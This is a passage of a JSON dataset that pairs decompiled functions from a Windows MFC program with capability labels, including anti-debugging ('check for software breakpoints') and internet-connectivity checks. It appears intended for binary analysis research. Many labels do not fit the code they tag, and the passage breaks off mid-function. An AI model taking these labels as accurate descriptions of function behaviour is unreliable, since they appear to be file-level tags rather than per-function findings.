        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_40h\n\nuint fcn.0041f5e1(void)\n\n{\n    int32_t *arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint *puVar4;\n    uint *puVar5;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch;\n    uint var_10h_2;\n    uint var_14h;\n    uint var_18h;\n    uint var_10h;\n    uint var_40h;\n    uint var_24h;\n    uint var_14h_2;\n    uint var_ch_2;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(unaff_EBP + -0x10) = &stack0xffffffc0;\n    iVar1 = fcn.00437973(0x434c5a);\n    puVar4 = iVar1 + 0x58;\n    puVar5 = unaff_EBP + -0x40;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    iVar3 = *(unaff_EBP + 0x10);\n    arg_8h = *(unaff_EBP + 8);\n    *(iVar1 + 0x58) = *(unaff_EBP + 0xc);\n    *(iVar1 + 0x60) = *(unaff_EBP + 0x14);\n    *(iVar1 + 100) = *(unaff_EBP + 0x18);\n    *(unaff_EBP + -0x14) = iVar1;\n    *(iVar1 + 0x5c) = iVar3;\n    *(unaff_EBP + -4) = 0;\n    if ((iVar3 == 2) && (arg_8h[0x12] != 0)) {\n        (**(*arg_8h[0x12] + 0x60))(0);\n    }\n    *(unaff_EBP + 8) = 0;\n    if (iVar3 == 0x110) {\n        fcn.0041e41f(arg_8h, unaff_EBP + -0x24, unaff_EBP + 8);\n    }\n    uVar2 = (**(*arg_8h + 0x108))(iVar3, *(unaff_EBP + 0x14), *(unaff_EBP + 0x18));\n    *(unaff_EBP + 0x18) = uVar2;\n    if (iVar3 == 0x110) {\n        fcn.0041f568(arg_8h, unaff_EBP + -0x24);\n    }\n    uVar2 = *(unaff_EBP + 0x18);\n    puVar4 = unaff_EBP + -0x40;\n    puVar5 = iVar1 + 0x58;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 778
    },
    "0041f719": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0041f719(void)\n\n{\n    code *pcVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CWnd.0;\n    *(unaff_EBP + -4) = 0;\n    if ((((extraout_ECX[7] != NULL) && (extraout_ECX != 0x450ab0)) && (extraout_ECX != 0x450b00)) &&\n       ((extraout_ECX != 0x450b50 && (extraout_ECX != 0x450ba0)))) {\n        fcn.0041f10d();\n    }\n    if (extraout_ECX[0x12] != NULL) {\n        (**(*extraout_ECX[0x12] + 4))(1);\n    }\n    pcVar1 = extraout_ECX[0x13];\n    if ((pcVar1 != NULL) && (*(pcVar1 + 0x24) == extraout_ECX)) {\n        *(pcVar1 + 0x24) = 0;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041bd60();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 355
    },
    "0041f877": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0041f877(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    \n    if ((param_1 != NULL) && (param_1[7] != 0)) {\n        iVar2 = (**(*param_1 + 0x120))();\n        piVar3 = param_1;\n        if (iVar2 == 0) {\n            param_1 = fcn.0041f838();\n            piVar3 = param_1;\n        }\n        while (piVar1 = piVar3,  piVar1 != NULL) {\n            piVar3 = fcn.0041f838();\n            param_1 = piVar1;\n        }\n        return param_1;\n    }\n    return NULL;\n}\n",
        "token_count": 186
    },
    "0041f8b8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041f8b8(uint arg_8h, uint Msg, uint wParam, uint lParam, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    code *pcVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetTopWindow;\n    for (arg_8h_00 = (*_sym.imp.USER32.dll_GetTopWindow)(arg_8h); arg_8h_00 != 0;\n        arg_8h_00 = (*_sym.imp.USER32.dll_GetWindow)(arg_8h_00, 2)) {\n        if (arg_1ch == 0) {\n            (*_sym.imp.USER32.dll_SendMessageA)(arg_8h_00, Msg, wParam, lParam);\n        }\n        else {\n            iVar2 = fcn.0041eede(arg_8h_00);\n            if (iVar2 != 0) {\n                fcn.0041f5e1(iVar2, *(iVar2 + 0x1c), Msg, wParam, lParam);\n            }\n        }\n        if (arg_18h != 0) {\n            iVar2 = (*pcVar1)(arg_8h_00);\n            if (iVar2 != 0) {\n                fcn.0041f8b8(arg_8h_00, Msg, wParam, lParam, arg_18h, arg_1ch);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 336
    },
    "0041fa3b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_88h\n\nvoid __cdecl fcn.0041fa3b(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_88h;\n    uint hWnd;\n    uint var_38h;\n    uint var_34h;\n    uint var_24h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.0041bffb();\n    fcn.0041e3dc();\n    uVar1 = *(extraout_ECX + 0x1c);\n    *(unaff_EBP + -4) = 0;\n    iVar2 = (*_sym.imp.USER32.dll_GetTopWindow)(uVar1);\n    do {\n        if (iVar2 == 0) {\n            *(unaff_EBP + -4) = 0xffffffff;\n            *(unaff_EBP + -0x6c) = 0;\n            fcn.0041f719();\n            *in_FS_OFFSET = *(unaff_EBP + -0xc);\n            return;\n        }\n        *(unaff_EBP + -0x6c) = iVar2;\n        uVar3 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(iVar2);\n        *(unaff_EBP + -0x34) = uVar3 & 0xffff;\n        *(unaff_EBP + -0x24) = unaff_EBP + -0x88;\n        iVar4 = fcn.0041eede(iVar2);\n        if (((iVar4 == 0) || (iVar4 = fcn.0041be83(0, 0xbd11ffff, unaff_EBP + -0x38, 0),  iVar4 == 0)) &&\n           (iVar4 = fcn.0041be83(*(unaff_EBP + -0x34), 0xffffffff, unaff_EBP + -0x38, 0),  iVar4 == 0)) {\n            iVar4 = *(unaff_EBP + 0xc);\n            if (iVar4 != 0) {\n                uVar3 = (*_sym.imp.USER32.dll_SendMessageA)(*(unaff_EBP + -0x6c), 0x87, 0, 0);\n                if ((uVar3 & 0x2000) != 0) {\n                    uVar3 = fcn.0041cced();\n                    uVar3 = uVar3 & 0xf;\n                    if (((uVar3 != 3) && (uVar3 != 6)) && ((uVar3 != 7 && (uVar3 != 9)))) goto code_r0x0041fb0a;\n                }\n                iVar4 = 0;\n            }\ncode_r0x0041fb0a:\n            fcn.0041c021(*(unaff_EBP + 8), iVar4);\n        }\n        iVar2 = (*_sym.imp.USER32.dll_GetWindow)(iVar2, 2);\n    } while( true );\n}\n",
        "token_count": 735
    },
    "0041fb4c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0041fb4c(int32_t *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint unaff_retaddr;\n    \n    iVar1 = fcn.0041eef8(param_2);\n    if (iVar1 != 0) {\n        (**(*param_1 + 0x50))();\n        piVar2 = (**(*param_1 + 0xf0))();\n        iVar1 = (*_sym.imp.USER32.dll_SetWindowLongA)(unaff_retaddr, 0xfffffffc, fcn.0041f6ce);\n        if (*piVar2 == 0) {\n            *piVar2 = iVar1;\n        }\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 181
    },
    "0041fbaa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041fbaa(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(param_1 + 0x4c) == 0) {\n        iVar1 = (*_sym.imp.USER32.dll_GetWindowTextLengthA)(*(param_1 + 0x1c));\n        uVar2 = fcn.00408978(iVar1, iVar1 + 1);\n        (*_sym.imp.USER32.dll_GetWindowTextA)(*(param_1 + 0x1c), uVar2);\n        fcn.00407fe0(0xffffffff);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041fbe9. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0x8c))();\n    return;\n}\n",
        "token_count": 204
    },
    "0041fec5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041fec5(uint32_t wParam, int32_t lParam)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t in_ECX;\n    uint32_t uVar7;\n    uint hWnd;\n    \n    iVar4 = fcn.0041fe34();\n    uVar7 = wParam & 0xfff0;\n    if ((uVar7 == 0xf040) || (uVar7 == 0xf050)) {\n        if (lParam != 0x75) {\n            return 0;\n        }\n        if (iVar4 == 0) {\n            return 0;\n        }\n        fcn.0041ce16();\n    }\n    else {\n        if ((uVar7 != 0xf060) && (uVar7 != 0xf100)) {\n            return 0;\n        }\n        if (((uVar7 == 0xf060) || (lParam != 0)) && (iVar4 != 0)) {\n            uVar1 = *(in_ECX + 0x1c);\n            uVar5 = (*_sym.imp.USER32.dll_GetFocus)();\n            pcVar3 = _sym.imp.USER32.dll_SetActiveWindow;\n            uVar6 = (*_sym.imp.USER32.dll_SetActiveWindow)(*(iVar4 + 0x1c));\n            fcn.0041eeb7(uVar6);\n            (*_sym.imp.USER32.dll_SendMessageA)(*(iVar4 + 0x1c), 0x112, wParam, lParam);\n            pcVar2 = _sym.imp.USER32.dll_IsWindow;\n            iVar4 = (*_sym.imp.USER32.dll_IsWindow)(uVar1);\n            if (iVar4 != 0) {\n                (*pcVar3)(uVar1);\n            }\n            iVar4 = (*pcVar2)(uVar5);\n            if (iVar4 != 0) {\n                (*_sym.imp.USER32.dll_SetFocus)(uVar5);\n            }\n        }\n    }\n    return 1;\n}\n",
        "token_count": 460
    },
    "00420061": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00420061(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    uint *puVar5;\n    uint *puVar6;\n    uint var_2ch;\n    uint var_28h;\n    uint *var_24h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar2 = _sym.imp.USER32.dll_SendDlgItemMessageA;\n    var_4h = 1;\n    if (arg_8h != NULL) {\n        do {\n            iVar1 = *arg_8h;\n            if (iVar1 == 0) break;\n            iVar3 = arg_8h[1];\n            var_8h = *(arg_8h + 2);\n            puVar5 = arg_8h + 4;\n            if (iVar3 == 0x1234) {\ncode_r0x004200c8:\n                (**0x44d0c0)();\n                var_28h = 0xffffffff;\n                var_2ch = 1;\n                iVar3 = 0x401;\n                puVar6 = &var_2ch;\n                var_24h = puVar5;\ncode_r0x00420103:\n                iVar4 = (*pcVar2)(*(in_ECX + 0x1c), iVar1, iVar3, 0, puVar6);\n                if (iVar4 == -1) {\n                    var_4h = 0;\n                }\n            }\n            else {\n                puVar6 = puVar5;\n                if (iVar3 == 0x401) {\n                    iVar3 = 0x180;\n                    goto code_r0x00420103;\n                }\n                if (iVar3 == 0x403) {\n                    iVar3 = 0x143;\n                }\n                if (iVar3 == 0x401) goto code_r0x004200c8;\n                if ((iVar3 == 0x180) || (iVar3 == 0x143)) goto code_r0x00420103;\n            }\n            arg_8h = puVar5 + var_8h;\n        } while (var_4h != 0);\n        if (var_4h == 0) {\n            return 0;\n        }\n    }\n    fcn.0041f8b8(*(in_ECX + 0x1c), 0x364, 0, 0, 0, 0);\n    return var_4h;\n}\n",
        "token_count": 572
    },
    "00420371": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420371(int32_t arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    int32_t iVar8;\n    code **ppcVar9;\n    code *pcVar10;\n    uint var_13ch;\n    uint var_10ch;\n    uchar var_dh;\n    uint32_t var_ch;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    iVar4 = fcn.00437973(0x434c5a);\n    if (arg_8h != 3) {\n        (*_sym.imp.USER32.dll_CallNextHookEx)(*(iVar4 + 0x28), arg_8h, arg_ch, arg_10h);\n        goto code_r0x00420583;\n    }\n    piVar2 = *(iVar4 + 0x14);\n    iVar8 = *arg_10h;\n    iVar5 = fcn.00434fe8();\n    cVar1 = *(iVar5 + 0x14);\n    if ((piVar2 != NULL) || (((*(iVar8 + 0x23) & 0x40) == 0 && (cVar1 == '\\0')))) {\n        if (*0x450fcc == 0) {\ncode_r0x00420434:\n            if (piVar2 == NULL) {\n                if (*0x450bf0 == 0) {\n                    fcn.0040bbe0(&var_13ch, 0, 0x30);\n                    var_13ch = 0x30;\n                    *0x450bf0 = (*_sym.imp.USER32.dll_GetClassInfoExA)(0, \"#32768\", &var_13ch);\n                    if (*0x450bf0 != 0) goto code_r0x004204ba;\n                    iVar8 = (*_sym.imp.USER32.dll_GetClassNameA)(arg_ch, &var_10ch, 0x100);\n                    if (iVar8 != 0) {\n                        var_dh = 0;\n                        iVar8 = fcn.0040c688(&var_10ch, \"#32768\");\n                        if (iVar8 == 0) goto code_r0x00420559;\n                    }\n                }\n                else {\ncode_r0x004204ba:\n                    iVar3 = (*_sym.imp.USER32.dll_GetClassLongA)(arg_ch, 0xffffffe0);\n                    if (iVar3 == *0x450bf0) goto code_r0x00420559;\n                }\n                var_ch = (*_sym.imp.USER32.dll_GetWindowLongA)(arg_ch, 0xfffffffc);\n                pcVar10 = _sym.imp.USER32.dll_GetPropA;\n                if ((var_ch != 0) && (iVar8 = (*_sym.imp.USER32.dll_GetPropA)(arg_ch, \"AfxOldWndProc423\"),  iVar8 == 0))\n                {\n                    (*_sym.imp.USER32.dll_SetPropA)(arg_ch, \"AfxOldWndProc423\", var_ch);\n                    uVar6 = (*pcVar10)(arg_ch, \"AfxOldWndProc423\");\n                    if (uVar6 == var_ch) {\n                        (*_sym.imp.KERNEL32.dll_GlobalAddAtomA)(\"AfxOldWndProc423\");\n                        (*_sym.imp.USER32.dll_SetWindowLongA)(arg_ch, 0xfffffffc, 0x420219);\n                    }\n                }\n            }\n            else {\n                fcn.0041eef8(arg_ch);\n                (**(*piVar2 + 0x50))();\n                ppcVar9 = (**(*piVar2 + 0xf0))();\n                pcVar10 = (*_sym.imp.USER32.dll_SetWindowLongA)(arg_ch, 0xfffffffc, fcn.0041f6ce);\n                if (pcVar10 != fcn.0041f6ce) {\n                    *ppcVar9 = pcVar10;\n                }\n                *(iVar4 + 0x14) = 0;\n            }\n        }\n        else {\n            uVar6 = (*_sym.imp.USER32.dll_GetClassLongA)(arg_ch, 0xffffffe6);\n            if ((uVar6 & 0x10000) == 0) {\n                puVar7 = *(iVar8 + 0x28);\n                if (puVar7 < 0x10000) {\n                    var_ch = var_ch & 0xffffff00;\n                    (*_sym.imp.KERNEL32.dll_GlobalGetAtomNameA)(*(iVar8 + 0x28), &var_ch, 5);\n                    puVar7 = &var_ch;\n                }\n                iVar8 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(puVar7, 0x440244);\n                if (iVar8 != 0) goto code_r0x00420434;\n            }\n        }\n    }\ncode_r0x00420559:\n    (*_sym.imp.USER32.dll_CallNextHookEx)(*(iVar4 + 0x28), 3, arg_ch, arg_10h);\n    if (cVar1 != '\\0') {\n        (*_sym.imp.USER32.dll_UnhookWindowsHookEx)(*(iVar4 + 0x28));\n        *(iVar4 + 0x28) = 0;\n    }\ncode_r0x00420583:\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 1219
    },
    "00420590": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00420590(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_retaddr;\n    \n    iVar1 = fcn.00437973(0x434c5a);\n    if (*(iVar1 + 0x14) != unaff_retaddr) {\n        if (*(iVar1 + 0x28) == 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            iVar3 = (*_sym.imp.USER32.dll_SetWindowsHookExA)(5, fcn.00420371, 0, uVar2);\n            *(iVar1 + 0x28) = iVar3;\n            if (iVar3 == 0) {\n                fcn.004198b2();\n            }\n        }\n        *(iVar1 + 0x14) = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 202
    },
    "00420715": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_74h\n\nuint __cdecl fcn.00420715(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    int32_t *arg_8h_00;\n    uint *puVar9;\n    uint *puVar10;\n    int32_t unaff_EBP;\n    int16_t iVar11;\n    uint *in_FS_OFFSET;\n    int32_t *in_stack_ffffff70;\n    uint in_stack_ffffff84;\n    uint var_74h;\n    uint var_58h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(unaff_EBP + -0x10) = 0;\n    uVar7 = *(unaff_EBP + 8);\n    if (uVar7 == 0x111) {\n        iVar4 = (**(*arg_8h_00 + 0xe8))(*(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n        if (iVar4 == 0) goto code_r0x00420900;\ncode_r0x00420bb0:\n        *(unaff_EBP + -0x10) = 1;\n        goto code_r0x00420c08;\n    }\n    if (uVar7 == 0x4e) {\n        if (**(unaff_EBP + 0x10) == 0) goto code_r0x00420900;\n        iVar4 = (**(*arg_8h_00 + 0xec))(*(unaff_EBP + 0xc), *(unaff_EBP + 0x10), unaff_EBP + -0x10);\ncode_r0x00420bd4:\n        if (iVar4 == 0) goto code_r0x00420900;\n        goto code_r0x00420c08;\n    }\n    puVar9 = *(unaff_EBP + 0x10);\n    if (uVar7 == 6) {\n        in_stack_ffffff84 = fcn.0041eeb7(puVar9);\n        fcn.00420142(arg_8h_00, *(unaff_EBP + 0xc), in_stack_ffffff84);\n    }\n    iVar11 = puVar9;\n    if ((uVar7 == 0x20) &&\n       (in_stack_ffffff70 = arg_8h_00,  iVar4 = fcn.004201a3(arg_8h_00, iVar11, puVar9 >> 0x10),  iVar4 != 0))\n    goto code_r0x00420bb0;\n    if (((arg_8h_00[0x12] != 0) && (0 < *(arg_8h_00[0x12] + 0x70))) &&\n       ((((0x1ff < uVar7 && (uVar7 < 0x20a)) || ((0xff < uVar7 && (uVar7 < 0x110)))) ||\n        ((0x280 < uVar7 && (uVar7 < 0x292)))))) {\n        in_stack_ffffff70 = *(unaff_EBP + 0xc);\n        iVar4 = (**(*arg_8h_00[0x12] + 0x94))(uVar7, in_stack_ffffff70, puVar9, unaff_EBP + -0x10);\n        if (iVar4 == 0) goto code_r0x00420807;\n        goto code_r0x00420c08;\n    }\ncode_r0x00420807:\n    uVar5 = (**(*arg_8h_00 + 0x28))();\n    *(unaff_EBP + -0x14) = uVar5;\n    uVar7 = *(unaff_EBP + 8);\n    fcn.00437b0b(7);\n    iVar4 = ((uVar5 ^ uVar7) & 0x1ff) * 0xc;\n    iVar6 = *(unaff_EBP + -0x14);\n    if ((*(unaff_EBP + 8) != *(iVar4 + 0x44f280)) || (iVar6 != *(iVar4 + 0x44f288))) {\n        *(iVar4 + 0x44f280) = *(unaff_EBP + 8);\n        *(iVar4 + 0x44f288) = iVar6;\n        while (iVar6 != 0) {\n            if (*(unaff_EBP + 8) < 0xc000) {\n                iVar6 = fcn.0041da9d(*(*(unaff_EBP + -0x14) + 4), *(unaff_EBP + 8), in_stack_ffffff70, 0);\n                *(unaff_EBP + 0x10) = iVar6;\n                if (iVar6 != 0) {\n                    *(iVar4 + 0x44f284) = iVar6;\n                    fcn.00437b6e(7);\n                    goto code_r0x00420898;\n                }\n            }\n            else {\n                iVar6 = *(*(unaff_EBP + -0x14) + 4);\n                while( true ) {\n                    iVar6 = fcn.0041da9d(iVar6, 0xc000, 0, in_stack_ffffff84);\n                    *(unaff_EBP + 0x10) = iVar6;\n                    if (iVar6 == 0) break;\n                    if (**(*(unaff_EBP + 0x10) + 0x10) == *(unaff_EBP + 8)) {\n                        *(iVar4 + 0x44f284) = *(unaff_EBP + 0x10);\n                        fcn.00437b6e(7);\n                        goto code_r0x00420bf7;\n                    }\n                    iVar6 = *(unaff_EBP + 0x10) + 0x18;\n                }\n            }\n            iVar6 = **(unaff_EBP + -0x14);\n            *(unaff_EBP + -0x14) = iVar6;\n        }\n        *(iVar4 + 0x44f284) = 0;\n        fcn.00437b6e(7);\ncode_r0x00420900:\n        uVar8 = 0;\n        goto code_r0x00420902;\n    }\n    iVar4 = *(iVar4 + 0x44f284);\n    *(unaff_EBP + 0x10) = iVar4;\n    fcn.00437b6e(7);\n    if (iVar4 == 0) goto code_r0x00420900;\n    if (0xbfff < *(unaff_EBP + 8)) {\ncode_r0x00420bf7:\n        uVar8 = (**(*(unaff_EBP + 0x10) + 0x14))(*(unaff_EBP + 0xc), puVar9);\n        goto code_r0x00420c05;\n    }\ncode_r0x00420898:\n    pcVar1 = *(*(unaff_EBP + 0x10) + 0x14);\n    iVar4 = *(*(unaff_EBP + 0x10) + 0x10);\n    iVar3 = puVar9 >> 0x10;\n    // switch table (65 cases) at 0x420c1c\n    switch(iVar4) {\n    case 1:\n        puVar9 = *(unaff_EBP + 0xc);\n        fcn.0042627a(puVar9);\n        goto code_r0x00420a21;\n    case 2:\n    case 3:\n    case 4:\n    case 0x18:\n    case 0x19:\n        puVar9 = *(unaff_EBP + 0xc);\n        goto code_r0x00420a21;\n    case 5:\n    case 0xc:\n        uVar5 = puVar9 >> 0x10;\n        puVar9 = puVar9 & 0xffff;\n        uVar7 = *(unaff_EBP + 0xc);\n        uVar5 = fcn.0041eeb7(uVar7, puVar9, uVar5);\n        goto code_r0x00420a45;\n    case 6:\n        uVar7 = fcn.0041eeb7(*(unaff_EBP + 0xc), puVar9);\n        goto code_r0x00420b5a;\n    case 7:\n    case 0xd:\ncode_r0x00420a21:\n        uVar8 = (*pcVar1)(puVar9);\n        goto code_r0x00420c05;\n    case 8:\n        fcn.00425f52();\n        uVar8 = puVar9[1];\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x20) = uVar8;\n        fcn.0041e3dc();\n        uVar8 = *puVar9;\n        uVar2 = puVar9[2];\n        *(unaff_EBP + -4) = 1;\n        *(unaff_EBP + -0x58) = uVar8;\n        iVar4 = fcn.0041eede(uVar8);\n        if (iVar4 == 0) {\n            if ((arg_8h_00[0x12] != 0) && (iVar4 = fcn.0041b576(*(unaff_EBP + -0x58)),  iVar4 != 0)) {\n                *(unaff_EBP + -0x28) = iVar4;\n            }\n            iVar4 = unaff_EBP + -0x74;\n        }\n        uVar8 = (*pcVar1)(unaff_EBP + -0x24, iVar4, uVar2);\n        *(unaff_EBP + -0x20) = 0;\n        *(unaff_EBP + -0x58) = 0;\n        *(unaff_EBP + -0x10) = uVar8;\n        *(unaff_EBP + -4) = 0;\n        fcn.0041f719();\n        goto code_r0x004209f0;\n    case 9:\n        fcn.00425f52();\n        uVar8 = puVar9[2];\n        *(unaff_EBP + -0x20) = puVar9[1];\n        *(unaff_EBP + -4) = 2;\n        uVar8 = (*pcVar1)(unaff_EBP + -0x24, uVar8);\n        *(unaff_EBP + -0x20) = 0;\n        *(unaff_EBP + -0x10) = uVar8;\ncode_r0x004209f0:\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.004262f0();\n        break;\n    case 10:\n        uVar7 = fcn.0041eeb7(puVar9, *(unaff_EBP + 0xc) >> 0x10);\n        goto code_r0x00420a40;\n    case 0xb:\n        puVar9 = *(unaff_EBP + 0xc) >> 0x10;\n        uVar7 = *(unaff_EBP + 0xc);\n        goto code_r0x00420b5a;\n    case 0xe:\n    case 0x2c:\n        uVar7 = *(unaff_EBP + 0xc);\n        goto code_r0x00420b5a;\n    case 0xf:\n        puVar9 = fcn.004235b4(puVar9);\n        uVar7 = *(unaff_EBP + 0xc) >> 0x10;\ncode_r0x00420a40:\n        uVar5 = *(unaff_EBP + 0xc);\ncode_r0x00420a45:\n        uVar8 = (*pcVar1)(uVar5, uVar7, puVar9);\n        goto code_r0x00420c05;\n    case 0x10:\n        (*pcVar1)();\n        break;\n    case 0x11:\n        puVar9 = *(unaff_EBP + 0xc);\n        goto code_r0x00420b7a;\n    case 0x12:\n    case 0x1b:\n    case 0x2a:\n    case 0x2f:\n        goto code_r0x00420b6d;\n    case 0x13:\n        puVar9 = *(unaff_EBP + 0xc) >> 0x10;\n        uVar7 = *(unaff_EBP + 0xc);\n        goto code_r0x00420b70;\n    case 0x14:\n        puVar9 = iVar3;\n        uVar7 = iVar11;\n        goto code_r0x00420b70;\n    case 0x15:\n    case 0x16:\n        puVar10 = puVar9 >> 0x10;\n        uVar7 = puVar9 & 0xffff;\n        goto code_r0x00420b9e;\n    case 0x17:\n        fcn.0041eeb7(puVar9);\ncode_r0x00420b6d:\n        uVar7 = *(unaff_EBP + 0xc);\n        goto code_r0x00420b70;\n    case 0x1a:\n    case 0x25:\n    case 0x2e:\n        uVar8 = (*pcVar1)();\n        goto code_r0x00420c05;\n    case 0x1c:\n        puVar10 = *(unaff_EBP + 0xc);\n        uVar7 = fcn.0041eeb7(puVar10);\n        fcn.0041eeb7(puVar9, uVar7);\n        uVar5 = arg_8h_00[7] == puVar9;\n        goto code_r0x00420ba2;\n    case 0x1d:\n        puVar9 = *(unaff_EBP + 0xc);\n        fcn.0042627a(puVar9);\n        goto 